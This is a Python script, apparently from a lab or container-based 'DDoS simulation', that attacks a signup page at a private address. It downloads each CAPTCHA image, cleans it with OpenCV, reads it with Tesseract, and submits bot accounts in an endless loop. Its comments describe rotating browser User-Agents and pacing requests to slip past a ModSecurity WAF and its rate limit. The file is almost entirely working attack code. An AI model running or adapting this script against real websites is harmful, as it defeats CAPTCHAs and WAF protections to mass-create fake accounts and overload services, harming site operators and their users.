import requests
import random
import string
import threading
import time
import urllib3
import io
import shutil
import sys

# --- IMPORT DEPENDENCIES SAFELY ---
try:
    from PIL import Image
    import pytesseract
    import io
    import cv2
    import numpy as np
except ImportError:
    print("[-] ERROR: Missing Python libraries.")
    print("    Run: pip install pytesseract pillow opencv-python-headless numpy")
    sys.exit(1)

# --- CONFIGURATION ---
TARGET_URL = "https://10.10.10.3/signup"
CAPTCHA_URL = "https://10.10.10.3/captcha/image"
HOST_HEADER = "web.sun.dmz"
THREAD_COUNT = 1 # ONE thread per container for the DDoS simulation

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# List of realistic User-Agents to rotate (Bypasses WAF Reputation/Scripting detection)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
]

def check_system_dependencies():
    """Verifies that the Tesseract binary is installed on the OS."""
    if shutil.which('tesseract') is None:
        print("[-] FATAL ERROR: 'tesseract' binary not found in PATH.")
        sys.exit(1)

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def solve_captcha_opencv(image_bytes):
    """
    Robust solver using OpenCV to clean noise before passing to Tesseract.
    """
    try:
        # Convert bytes to numpy array
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        
        # 1. Thresholding (Otsu's method determines optimal threshold automatically)
        _, img = cv2.threshold(img, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)

        # 2. Remove Noise (Morphological Opening)
        kernel = np.ones((2,2), np.uint8)
        img = cv2.morphologyEx(img, cv2.MORPH_OPEN, kernel)

        # 3. Dilation (Thicken the text)
        img = cv2.dilate(img, kernel, iterations=1)

        # 4. Invert back (Tesseract prefers black text on white bg)
        img = cv2.bitwise_not(img)
        
        # 5. Resize (Scale up for better OCR)
        img = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)

        # Solve
        custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        result = pytesseract.image_to_string(img, config=custom_config)
        
        return ''.join(filter(str.isalnum, result)).strip().upper()
    except Exception as e:
        # print(f"OCR Error: {e}")
        return ""

def attack_worker():
    # Create session
    session = requests.Session()
    session.verify = False
    
    # --- WAF EVASION ---
    # We set a realistic Browser User-Agent to prevent ModSecurity from 
    # flagging us as "python-requests" (Scripting Bot).
    session.headers.update({
        "Host": HOST_HEADER,
        "User-Agent": random.choice(USER_AGENTS)
    })

    while True:
        try:
            # RATE LIMITING: Sleep to bypass WAF (Limit is 1r/s per IP)
            # We sleep 1.5s to be safe.
            time.sleep(1.5)

            # 1. Download the Image
            try:
                r_img = session.get(CAPTCHA_URL, timeout=5)
                if r_img.status_code != 200:
                    continue
            except:
                continue

            # 2. Solve with OpenCV
            captcha_guess = solve_captcha_opencv(r_img.content)

            if not captcha_guess:
                continue

            # 3. Submit the Signup
            username = f"bot_{generate_random_string(8)}"
            password = "Password123!@"

            r_post = session.post(TARGET_URL, data={
                "username": username,
                "password": password,
                "captcha_answer": captcha_guess
            }, timeout=5)

            # 4. Check Result
            if r_post.status_code == 302 or "dashboard" in r_post.text:
                print(f"[+] SUCCESS: Created {username}")
            elif r_post.status_code == 503 or r_post.status_code == 429:
                print(f"[-] WAF BLOCKED (Rate Limit Hit)")
            elif r_post.status_code == 403:
                print(f"[-] WAF BLOCKED (Forbidden - Signature Detected)")

        except Exception as e:
            time.sleep(1)

def start_attack():
    check_system_dependencies()
    # Since this runs inside a single-process docker container, 
    # we just run the worker directly.
    attack_worker()

if __name__ == "__main__":
    start_attack()